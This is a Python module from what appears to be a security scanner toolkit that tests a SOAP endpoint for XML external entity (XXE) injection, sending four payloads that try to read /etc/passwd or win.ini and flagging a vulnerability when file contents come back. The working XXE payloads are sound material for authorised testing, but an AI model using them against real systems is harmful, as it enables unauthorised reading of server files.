"""
SOAP XXE Injection test

Tests whether the server resolves XML external entities,
which could allow reading local files or SSRF.
"""
from ptlibs.ptjsonlib import PtJsonLib
from ptlibs.http.http_client import HttpClient
from argparse import Namespace
from ptlibs.ptprinthelper import ptprint

__TESTLABEL__ = "SOAP XXE Injection test"


class XXETest:
    def __init__(self, args, ptjsonlib, helpers, http_client, common_tests):
        self.args = args
        self.ptjsonlib = ptjsonlib
        self.helpers = helpers
        self.http_client = http_client
        self.common_tests = common_tests
        self.helpers.print_header(__TESTLABEL__)

    def run(self):
        payloads = [
            {
                "name": "SOAP Body /etc/passwd",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Body><message>&xxe;</message></soapenv:Body>'
                    '</soapenv:Envelope>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "SOAP <message> /etc/passwd",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Body><echo><message>&xxe;</message></echo></soapenv:Body>'
                    '</soapenv:Envelope>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "Plain XML <message> /etc/passwd",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<message>&xxe;</message>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "SOAP Body C:/Windows/win.ini",
                "data": (
                    '<?xml version="1.0"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Body><message>&xxe;</message></soapenv:Body>'
                    '</soapenv:Envelope>'
                ),
                "indicators": ["[fonts]", "[extensions]", "[mci extensions]"],
            },
        ]

        for payload in payloads:
            r = self.helpers.send_soap_request(data=payload["data"])
            if r is None:
                continue

            body_lower = r.text.lower()
            matched = [ind for ind in payload["indicators"] if ind.lower() in body_lower]

            if matched:
                snippet = r.text[:300].strip().replace('\n', ' ')
                ptprint(f"XXE vulnerability detected ({payload['name']})!", "VULN",
                        not self.args.json, indent=4, colortext=True)
                self.ptjsonlib.add_vulnerability(
                    "PTV-XML-XXE", node_key=self.helpers.node_key,
                    data={"evidence": f"Payload: {payload['name']}. "
                                      f"Response snippet: {snippet}"})
                return
            else:
                if "!entity" in body_lower or "!doctype" in body_lower:
                    ptprint(f"DTD processing detected but restricted ({payload['name']}).",
                            "INFO", not self.args.json, indent=4)

        ptprint("Server appears safe from XXE.", "OK", not self.args.json, indent=4)


def run(args, ptjsonlib, helpers, http_client, common_tests):
    XXETest(args, ptjsonlib, helpers, http_client, common_tests).run()
